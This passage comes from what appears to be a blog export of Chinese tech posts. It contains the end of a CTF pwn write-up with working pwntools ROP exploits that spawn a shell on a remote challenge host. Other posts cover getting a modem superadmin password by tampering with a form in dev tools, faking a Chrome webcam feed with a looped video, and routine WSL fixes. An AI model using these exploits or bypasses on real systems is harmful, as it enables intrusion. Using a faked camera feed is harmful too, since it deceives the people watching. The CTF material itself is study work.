|</span></span><br><span class="line"><span class="string">|  (data + bss)     |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       代码区      |</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 低地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;每台机子不一样</span></span><br><span class="line"><span class="string">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep -E &quot;rsi|rdx&quot;</span></span><br><span class="line"><span class="string">0x0000000000090528 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000011f497 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x0000000000090529 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a743 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000002a3e3 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc.address+<span class="number">0x90529</span></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/bin/sh &quot;</span>,<span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve&quot;</span>, <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;execve&#x27;</span>]))</span><br><span class="line">payload=flat([<span class="string">b&#x27;22222222&#x27;</span>, pop_rdi_ret, <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)),pop_rsi_ret,p64(<span class="number">0</span>),pop_rdx_rbx_ret,p64(<span class="number">0</span>),p64(<span class="number">0xdeadbeef</span>), libc.sym[<span class="string">&#x27;execve&#x27;</span>], (<span class="number">80</span> - <span class="number">9</span>*<span class="number">8</span> ) * <span class="string">b&#x27;2&#x27;</span>, buf - <span class="number">0x30</span>, <span class="number">0x4006be</span>])</span><br><span class="line"><span class="comment"># 此payload和之前的类似，但不同之处是最后是buf - 0x30</span></span><br><span class="line"><span class="comment"># 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置</span></span><br><span class="line"><span class="comment"># 执行完puts到最后程序ret又回到了sub_400676</span></span><br><span class="line"><span class="comment"># [b&#x27;11111111&#x27;, pop_rdi_ret, elf.got[&#x27;puts&#x27;], elf.plt[&#x27;puts&#x27;], 0x400676, (80 - 40) * b&#x27;1&#x27;, buf, leave_ret]</span></span><br><span class="line"><span class="comment"># 回想当我们正常进入sub_400676时push rbp之前，rsp指向的是payload中的leave_ret</span></span><br><span class="line"><span class="comment"># 而我们上一次通过ret进入sub_400676时push rbp之前，rsp指向payload中的0x400676的末尾</span></span><br><span class="line"><span class="comment"># 这两次rsp相差 (80 - 40) * &#x27;1&#x27;+ buf两段数据长0x30，也就是说rsp向下移动了0x30</span></span><br><span class="line"><span class="comment"># 所以第二次payload的&quot;22222222&quot;的填入地址减小了0x30</span></span><br><span class="line"><span class="comment"># 如果想不通就用gdb调试下，直接下断点看rsp值</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>远程打：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./over.over&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;114.51.41.9&quot;</span>, <span class="number">11451</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment">#bin_sh = libc.dump(&quot;str_bin_sh&quot;) + base</span></span><br><span class="line">system = libc.dump(<span class="string">&quot;system&quot;</span>) + base</span><br><span class="line"><span class="comment"># 远程打用execve要三个参数，有时找gadgets得用libc，就得去下载相应的libc，所以能用system就用system</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">❯ ROPgadget --binary over.over --only &quot;ret&quot;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400509 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ret = <span class="number">0x400509</span> <span class="comment"># 栈对齐</span></span><br><span class="line">payload=flat([<span class="string">b&#x27;/bin/sh\0&#x27;</span>, pop_rdi_ret, p64(buf-<span class="number">0x30</span>), ret, system, (<span class="number">80</span> - <span class="number">8</span>*<span class="number">5</span>)*<span class="string">b&quot;a&quot;</span>, buf - <span class="number">0x30</span>, leave_ret])</span><br><span class="line"><span class="comment"># 把字符串存栈里调用也可以</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="待添加"><a href="#待添加" class="headerlink" title="待添加"></a>待添加</h3>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>联通 PT928G 光猫改桥接</title>
    <url>/2024/10/02/unicom-Modem/</url>
    <content><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>国庆回家发现家里网用不了，原来是联通改光纤了。摇了师傅来家里重新接了线，同时也把老调制解调器换成了光猫。</p>
<p>那么问题来了，以前老铜线猫就起个桥接作用，都是用路由器拨号，现在换了光猫就变成光猫拨号了。光猫这东西我知道他有运营商限制，但是一直没机会搞，现在终于有机会了。</p>
<h3 id="破解超管密码"><a href="#破解超管密码" class="headerlink" title="破解超管密码"></a>破解超管密码</h3><p>首先打开光猫登陆页面 192.168.1.1，可以看到如下内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_login.png.avif"
                      alt="Login"
                ></p>
<p>选右边，在光猫机子背面找到密码登录，登录后直接点击管理选项找到密码修改页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_manage.png.avif"
                      alt="manage"
                ></p>
<p>虽然只有一个选项，但是可以通过 F12 修改前端，改变发包数据使得选择的用户变成超管</p>
<p>如图只需要把 <code>value</code> 从 <code>0</code> 改为 <code>1</code> 即可，旧密码就是 user 的旧密码，但是新密码修改的是超管的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_f12.png.avif"
                      alt="f12"
                ></p>
<p>修改完成后就可以回到主页登录超管了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_success.png.avif"
                      alt="超管"
                ></p>
<h3 id="修改桥接"><a href="#修改桥接" class="headerlink" title="修改桥接"></a>修改桥接</h3><p>先说一下我为什么要修改桥接，其实是为了让设备有 IPv6。我登录光猫超管后尝试了调它 IPv6 的选项，路由器也尝试开 NAT6。然后 IPv6 能上网了，但是路由器依旧无法给下层设备分配 IPv6 独立地址，还是改桥接最简单。</p>
<p>但是就早听说现在的光猫都有上级云控，WAN 配置里的 TR069 路由就是云控，据说删了就能防止云控了。我暂时先不删，看看后面会不会被恢复再另作打算</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_tr069.png.avif"
                      alt="tr069"
                ></p>
<p>改桥接没什么好说的，如下图很好改，然后在路由器设置拨号即可。要注意的是不要把光猫的 DHCP 关掉了，否则以后可能访问不到光猫。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_bridge.png.avif"
                      alt="bridge"
                ></p>
<h3 id="修改后效果"><a href="#修改后效果" class="headerlink" title="修改后效果"></a>修改后效果</h3><p>路由器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_router.png.avif"
                      alt="router"
                ></p>
<p>电脑：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/modem_pc.png.avif"
                      alt="pc"
                ></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>视频小技巧</title>
    <url>/2022/12/20/video-tips/</url>
    <content><![CDATA[<p>最近不得不制作一些视频，所以趁此机会写一些视频方面的花招</p>
<p>本文中使用的视频编辑器为Vegas</p>
<h3 id="帧数处理"><a href="#帧数处理" class="headerlink" title="帧数处理"></a>帧数处理</h3><p>Vegas渲染时可以调整帧数和比特率，对于我的视频，这两样不需要太高。</p>
<p>在渲染时，建议采用720P、12fps</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/xrrj.jpg.avif"
                      alt="渲染"
                ></p>
<p>为何要将帧数调低？因为帧数低更容易去掉视频中的不和谐感</p>
<p>另外，在生成低帧数视频后，可以使用各种工具插帧，生成高帧数视频</p>
<p>比如ffmpeg自带的光流算法插帧，但此方式不适合现实事物等画面高速移动的视频</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i in.mp4 -filter_complex &quot;minterpolate=&#x27;fps=30&#x27;&quot; out.mp4</span><br></pre></td></tr></table></figure></div>

<p>现在有很多AI插帧，效果都是比较好的</p>
<h3 id="模拟对焦"><a href="#模拟对焦" class="headerlink" title="模拟对焦"></a>模拟对焦</h3><p>早些时候的手机，录视频时会时不时出现模糊，那是在对焦。我们可以模拟对焦，并利用模糊来去除视频中的不和谐感。</p>
<p>要注意的是，既然决定使用这种方式，那整个视频中必须出现多次对焦画面，不然那一次对焦会显得很突兀。</p>
<p>Vegas中的散焦特效：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj.jpg.avif"
                      alt="散焦"
                ></p>
<p>为画面加上这个FX，就能模拟对焦了。配置中有时钟样式的按钮，点击就能按时间轴来配置各个时候的焦点参数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj_config.jpg.avif"
                      alt="config"
                ></p>
<p>早期手机的对焦方式是被动对焦，也就是根据镜头的成像来判断是否对准，所以在对焦时，往往会越过焦点后才能确认到焦点。</p>
<p>模拟的时候也要模拟这个行为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj_wave.jpg.avif"
                     
                ></p>
<p>如上图，在配置页面的右下脚选择曲线就能这样配置了。模拟对焦并不存在空间的概念，所以数值只有正没有负。</p>
<h3 id="平移和裁剪"><a href="#平移和裁剪" class="headerlink" title="平移和裁剪"></a>平移和裁剪</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/pkyi_cdjm.jpg.avif"
                     
                ></p>
<p>如图为Vegas的平移裁剪功能，是非常简陋的，但配合散焦特效也能消除不和谐感。其中的蒙板功能在平时编辑时也是非常有用的，可以去掉素材中的某个部分，或只显示某个部分。</p>
<p>暂时只写这些。最近事情多，但天天宅家里到现在还没阳。我好怕过年的时候阳了，那得难受死。</p>
<h3 id="Virtual-Camera"><a href="#Virtual-Camera" class="headerlink" title="Virtual Camera"></a>Virtual Camera</h3><p>更新于2022&#x2F;12&#x2F;22</p>
<p>有时我们需要虚拟摄像头，将视频文件推流出去。</p>
<p>要在一些会议类软件使用虚拟摄像头，可以使用OBS，具体使用方法网上有很详细的教程。</p>
<p>要在Chrome中将摄像头内容替换为视频文件，只需要添加启动参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome.exe --use-fake-device-for-media-stream --use-file-for-fake-video-capture=&quot;path2VideoFile&quot;</span><br></pre></td></tr></table></figure></div>

<p>此处的视频文件不能使用常见的mp4文件，而要使用yuv420p编码形式的视频文件。我们可以使用ffmpeg将普通mp4视频转为该类文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -i inputFile.mp4 -an -pix_fmt yuv420p outputFile.y4m</span></span><br></pre></td></tr></table></figure></div>

<p>视频将会循环推流，如何消除视频重新播放时的不和谐感呢？</p>
<p>首先录制视频时，内容要减少移动，这样会比较容易实现拼接，且对倒放法比较友好，下面介绍一下倒放法</p>
<p>倒放法，也就是将视频倒着放。在Vegas中，可以一键将视频倒放：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fjvr.jpg.avif"
                      alt="反转"
                ></p>
<p>右键素材，选择反转，素材就变成倒放了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fjvr_1.jpg.avif"
                      alt="反转"
                ></p>
<p>像上图这样，左侧正放，右侧倒放，中间交叉连接，视频就能比较自然地拼在一起，而且连接后的视频，头尾是一致的，重新播放的时候大大降低不和谐感</p>
<p>就写这些。最近每天只能待家里，感觉快疯了，唉</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>视频</tag>
        <tag>技巧</tag>
        <tag>剪辑</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL疑难杂症记录</title>
    <url>/2023/10/09/wsl-issues/</url>
    <content><![CDATA[<h3 id="WSL疑难杂症"><a href="#WSL疑难杂症" class="headerlink" title="WSL疑难杂症"></a>WSL疑难杂症</h3><p>把总结写在前面：WSL 真的依托答辩，新手最好不要用，能折腾死</p>
<p>WSL2的网络配置是雷区，非大佬者闲得没事千万不要乱调，否则搞坏了就等着重装吧</p>
<p>我的主系统是 Windows 11，WSL 是 Ubuntu + kali(推荐)</p>
<h3 id="wslhost-exe-调用-mstsc-exe-崩溃导致屏幕闪烁"><a href="#wslhost-exe-调用-mstsc-exe-崩溃导致屏幕闪烁" class="headerlink" title="wslhost.exe 调用 mstsc.exe 崩溃导致屏幕闪烁"></a>wslhost.exe 调用 mstsc.exe 崩溃导致屏幕闪烁</h3><p>解决方法写在最前面：</p>
<p>win11 系统直接 <code>wsl --update</code> 升级到最新版 wsl 就行了</p>
<p>之前用 winhex 看文件的时候发现看着看着 winhex 的界面就开始闪烁了，一秒闪一下。打开任务管理器，发现任务管理器界面也开始闪了，除了有点费眼睛之外倒是没影响其他软件使用。</p>
<p>当时没有找到原因，直到今天闲着没事看任务管理器，突然看见 <code>mstsc.exe</code> (远程桌面连接) 这个进程出现了，这个进程一般是用户手动打开才会出现的，我寻思不会是有人在爆破我的远程桌面吧，难道是中毒了？因为之前有需求用 flash ，我就在 gitlab 上找了个纯净版的 flash 安装了，不会真有病毒吧。</p>
<p>随后我看了下进程关系，发现居然是 <code>wslhost.exe</code> 在启动 <code>mstsc.exe</code> ，且 mstsc 的 PID 在不断变化，说明进程刚启动又退出了。随后搜索发现有微软官方仓库里有这个<a class="link"   href="https://github.com/microsoft/wslg/issues/676" >issue <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，同款问题一模一样。</p>
<h3 id="WSL安装32位运行库"><a href="#WSL安装32位运行库" class="headerlink" title="WSL安装32位运行库"></a>WSL安装32位运行库</h3><p>某天在 WSL 里运行某 32 位单文件程序，居然提示我 No such file or dict，我思来想去哪里出了问题，但迫于时间关系最后还是尝试用Vm开虚拟机，结果可以运行该程序。</p>
<p>既然这样那肯定就是依赖有问题，不会吧 WSL 不自带 32 位依赖吗，有点迷</p>
<p>Ubuntu 解决方法：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6:i386 libncurses5:i386 libstdc++6:i386</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure></div>

<p>其他系统的解决方法网上应该能搜到。</p>
<h3 id="WSL-迁移数据"><a href="#WSL-迁移数据" class="headerlink" title="WSL 迁移数据"></a>WSL 迁移数据</h3><p>WSL 默认安装在 C 盘，可以通过 export 命令将其导出，然后重新 import 时就能设置安装位置</p>
<p>重要提示：一定要在 unregister 前 export ，否则就会像我一样丢失当前系统里的所有数据 :)</p>
<p>具体的操作顺序如下：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span> <span class="comment">#关闭运行中的实例</span></span><br><span class="line">wsl <span class="literal">--export</span> Ubuntu D:\wsl_export\export.tar <span class="comment">#导出为文件</span></span><br><span class="line">wsl <span class="literal">--unregister</span> Ubuntu <span class="comment">#注销系统，相当于删除卸载，数据就没有了</span></span><br><span class="line">wsl <span class="literal">--import</span> Ubuntu D:\wsl\ D:\wsl_export\export.tar <span class="literal">--version</span> <span class="number">2</span> </span><br><span class="line"><span class="comment">#第一个路径是存放WSL虚拟磁盘vhdx文件的目录，相当于安装目录</span></span><br></pre></td></tr></table></figure></div>

<p>迁移完成后会发现登录用户默认变成 root 了，而最初安装系统的时候应该有提示让设置一个普通用户，所以使用此命令进行将之前的普通用户设置为默认：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">ubuntu config <span class="literal">--default-user</span> yourusername</span><br></pre></td></tr></table></figure></div>

<h3 id="WSL-Windows-网络互相访问方案"><a href="#WSL-Windows-网络互相访问方案" class="headerlink" title="WSL Windows 网络互相访问方案"></a>WSL Windows 网络互相访问方案</h3><p>WSL2使用内部VLAN进行网络连接，而且IP地址是动态的，Windows有时候想要访问WSL要去查IP，很麻烦。</p>
<h4 id="Windows-访问-WSL"><a href="#Windows-访问-WSL" class="headerlink" title="Windows 访问 WSL"></a>Windows 访问 WSL</h4><p>多数情况下，我们的需求只有 Windows 访问 WSL 。一个可行的思路是获取 WSL 的 IP ，并写入到 Windows 的 hosts 文件中，然后就可以通过域名来访问 WSL。</p>
<p>最简单有效的方法：</p>
<ul>
<li>首先在 Windows 中打开 <code>C:\Windows\System32\drivers\etc</code> 这个目录，右键属性，进入安全选项卡，在高级设置中将该文件夹的所有者改为你的账户，然后就可以对这个文件夹的权限进行更改了，我们需要将自己的账户对此文件夹的权限修改为完全控制。</li>
<li>进入 WSL 系统，编辑 <code>~/.bashrc</code> 文件，该文件是每次运行 bash 时会运行的脚本，具体操作如下：<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim ~/.bashrc</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>在文件末尾添加如下代码：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Add wsl ip to Windows hosts</span></span><br><span class="line">line=&quot;$(ifconfig eth0 | grep &#x27;inet &#x27; | awk &#x27;&#123;print $2&#125;&#x27;) wsl.ubuntu&quot; # 生成替换内容</span><br><span class="line">sed -i &quot;s/.*wsl.ubuntu.*/$line/g&quot; /mnt/c/Windows/System32/drivers/etc/hosts # 执行替换</span><br></pre></td></tr></table></figure></div>

<p>配置好后保存，重新进一下 WSL ，随后在 PowerShell 中 ping 一下看看：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\hexrotor&gt; ping wsl.ubuntu</span><br><span class="line"></span><br><span class="line">正在 Ping wsl.ubuntu [<span class="number">172.18</span><span class="type">.210.143</span>] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">172.18</span>.<span class="number">210.143</span> 的回复: 字节=<span class="number">32</span> 时间&lt;<span class="number">1</span>ms TTL=<span class="number">64</span></span><br></pre></td></tr></table></figure></div>

<p>上面这种方法是依赖 WSL 来写入，我自己最初想的是用 Windows 来写入(废案，仅供参考)：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f &quot;delims=&quot; <span class="variable">%%t</span> <span class="keyword">in</span> (&#x27;arp -a ^| <span class="built_in">findstr</span>  <span class="number">00</span>-<span class="number">11</span>-<span class="number">9</span>d-<span class="number">81</span>-<span class="number">3</span>c-<span class="number">1</span>e&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> list=<span class="variable">%%t</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%list%</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span> delims= &quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&quot;<span class="variable">%list%</span>&quot;) <span class="keyword">do</span> <span class="built_in">set</span> ip=<span class="variable">%%a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%ip%</span> WSL&gt;<span class="variable">%SystemRoot%</span>\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure></div>

<p>上面这个脚本依赖 arp 命令和 MAC 地址来获取 WSL 的 IP，其局限性在于，我们难以得知什么时候应该运行此脚本，即运行此脚本时 WSL 是否正在运行且有网络访问。否则 arp 命令将无法获取到 WSL 主机的 IP 信息。而如果不依赖 arp 而使用文件来间接传递 IP 信息，那为何不直接用 WSL 来写入 hosts 呢？</p>
<h4 id="WSL-访问-Windows"><a href="#WSL-访问-Windows" class="headerlink" title="WSL 访问 Windows"></a>WSL 访问 Windows</h4><p>WSL 其实自带访问 Windows 的域名，那就是当前的计算机名</p>
<p>比如我的计算机名为 HEXROTOR ，那么在 WSL 中直接 ping HEXROTOR，应该是可以通的。但不幸的是，WSL 会自动生成 hosts 文件，将 HEXROTOR 指向 127.0.1.1 ，虽然这个地址也能通往 Windows ，但几乎没有程序会 bind 这个地址，访问这个地址通常没有什么意义</p>
<p>不过好在，这个功能可以关闭。我们需要创建 <code>/etc/wsl.conf</code> ，并写入如下信息：</p>
<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[network]</span><br><span class="line">generateHosts = false</span><br></pre></td></tr></table></figure></div>

<p>随后我们重启计算机，刚才的配置就生效了，我们可以编辑 <code>/etc/hosts</code> ，删除行 <code>127.0.1.1       HEXROTOR.   HEXROTOR</code> 。</p>
<p>到这里还没完，理论上还要配置 Windows 防火墙，这个网上教程挺多的。</p>
<h4 id="2024-10-09-WSL-支持配置网络类型"><a href="#2024-10-09-WSL-支持配置网络类型" class="headerlink" title="2024.10.09 WSL 支持配置网络类型"></a>2024.10.09 WSL 支持配置网络类型</h4><p>最近不知道哪次更新后开始菜单多了个 WSL Settings，我一看好家伙，很多东西都能调，甚至能自定义 Linux 内核。不过最重要的是它支持了调整网络类型，以前 WSL 2 默认是 Nat 模式，Windows 层 System Proxy 要同步进去还蛮麻烦的，而现在可以直接把网络类型更改为 mirror 模式，</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/wsl_settings.png.avif"
                      alt="WSL Settings"
                ></p>
<p>如图上图，网络有 4 种模式，选择 mirror 的话 IP 会全部继承 Windows，包括 IPv6。并且直接通过 localhost+端口号就能实现双方互相访问，而且能自动同步 Windows 层配置的 localhost System Proxy，省去了人工步骤。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/wsl_mirror.jpg.avif"
                      alt="WSL Mirror"
                ></p>
<h3 id="WSL-与-Windows-PATH-冲突问题"><a href="#WSL-与-Windows-PATH-冲突问题" class="headerlink" title="WSL 与 Windows PATH 冲突问题"></a>WSL 与 Windows PATH 冲突问题</h3><p>默认情况下，WSL 的 PATH 中会包含 Windows 的 PATH，这可能会导致很多问题，最常见的是运行 npm 时，Windows 和 WSL 都安装了 node，就会出现冲突问题。</p>
<p>同时这样的设置也可能会使 ZSH 用户感到困扰，因为 WSL 访问 Windows 目录有速度衰减，而 ZSH 用户往往会使用类似 AutoSuggestion 插件对输入的命令进行实时检查是否可用，这导致ZSH会疯狂对所有 PATH 进行遍历查找，表现出来就是输命令一卡一卡的，回显很慢。</p>
<p>解决方法：在 <code>/etc/wsl.conf</code> 中加入 </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath=false</span><br></pre></td></tr></table></figure></div>

<p>但这样也许有点一刀切，有些目录是有用的，比如 VSCode 就能实现快速编辑 WSL 中的文件而不用去手动修改目录</p>
<p>以及 Pwntools 的分屏功能，Pwntools 会在使用 gdb.* 系列代码时尝试调用系统中的终端(仅测试过 WSL kali-linux)，如果你的 PATH 中有 Windows Terminal，那么配合 Pwndbg 展现出来的就是原生的分屏调试，非常好用</p>
<p>~&#x2F;.zshrc 参考：</p>
<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line"># Windows PATH</span><br><span class="line">export WIN_PATH=/mnt/<span class="keyword">c</span>/WINDOWS/system32:/mnt/<span class="keyword">c</span>/WINDOWS/System32/WindowsPowerShell/v1.<span class="number">0</span>/:/mnt/<span class="keyword">c</span>/Users/hex/AppData/Local/Microsoft/WindowsApps:<span class="string">&quot;/mnt/d/Microsoft VS Code/bin&quot;</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$WIN_PATH</span><br></pre></td></tr></table></figure></div>

<h3 id="休眠-x2F-睡眠后-WSL-时间出现问题"><a href="#休眠-x2F-睡眠后-WSL-时间出现问题" class="headerlink" title="休眠&#x2F;睡眠后 WSL 时间出现问题"></a>休眠&#x2F;睡眠后 WSL 时间出现问题</h3><p>今天突然发现又有这个问题了，我kernel版本可是已经升到了5.15.90.1，而微软2021年说在5.10.16就修复了这个问题，看来还是没修好</p>
<p>尝试 <code>sudo hwclock -s</code> ，并没有作用，随后尝试重启 WSL ，问题解决</p>
<p>搜索相关内容得知除了同步硬件时间，还可以通过 ntp 服务器来同步网络时间</p>
